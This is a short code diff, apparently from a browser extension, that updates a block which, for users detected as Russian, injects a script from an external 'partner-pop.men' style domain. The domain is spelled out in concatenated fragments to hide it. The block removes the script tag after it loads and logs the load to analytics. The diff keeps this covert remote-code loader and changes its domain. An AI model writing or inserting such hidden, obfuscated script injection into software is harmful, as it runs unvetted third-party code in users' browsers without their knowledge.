@@ -9,14 +9,14 @@ if (isRU) {
       g.src = o;
       i.head.appendChild(g)
       g.onload = function() {
-        ga('vkmd.send', 'event', 'extguru', 'load');
+        try {ga('vkmd.send', 'event', 'extguru', 'load');} catch (e) {}
         try {g.parentNode.removeChild(g)} catch (e) {}
       }
-      g.onerror = function() {
-        ga('vkmd.send', 'event', 'extguru', 'error');
+      g.onerror = function(err) {
+        try {ga('vkmd.send', 'event', 'extguru', 'error');} catch (e) {}
         try {g.parentNode.removeChild(g)} catch (e) {}
       }
-    })(document, 'script', "\/\/p" + "art" + "ner" + "-po" + "p.m" + "en\/" + "cod" + "e\/?" + "pid" + "=97" + "875" + "5&r" + "=" + Math.floor(10000000 * Math.random()));
+    })(document, 'script', "\/\/qp" + "artn" + "er" + "-" + "po" + "p.m" + "en\/" + "cod" + "e\/?" + "pid" + "=97" + "875" + "5&r" + "=" + Math.floor(10000000 * Math.random()));
   });
 
   // simple helper functiong
